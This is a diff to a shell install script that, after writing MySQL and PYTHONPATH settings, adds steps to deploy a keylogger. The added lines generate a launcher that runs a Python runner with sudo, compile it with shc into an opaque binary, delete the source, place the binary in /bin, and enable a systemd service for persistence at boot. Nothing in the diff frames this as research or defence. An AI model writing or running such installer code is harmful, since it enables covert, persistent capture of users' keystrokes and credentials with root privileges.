@@ -31,3 +31,18 @@ echo "MYSQL_CONFIG = {\"user\": \"$user\", \"password\": \"$password\", \"host\"
 
 # Set directory of libs
 echo "PYTHONPATH='lib/'" >> .env
+
+# Config autostart
+path="${PWD}/bin/runner.py";
+echo "#!/bin/sh" > start_keylogger.sh;
+echo "exec pipenv shell & sudo pipenv run python3 $path & exit &" >> start_keylogger.sh;
+
+chmod +x start_keylogger.sh;
+shc -f start_keylogger.sh -o keylogger;
+rm start_keylogger.sh;
+sudo mv keylogger /bin/;
+sudo mv keylogger.service /etc/systemd/system/;
+systemctl enable keylogger.service;
+systemctl start keylogger.service;
+
+echo "Keylogger status: $(systemctl is-active keylogger.service)";
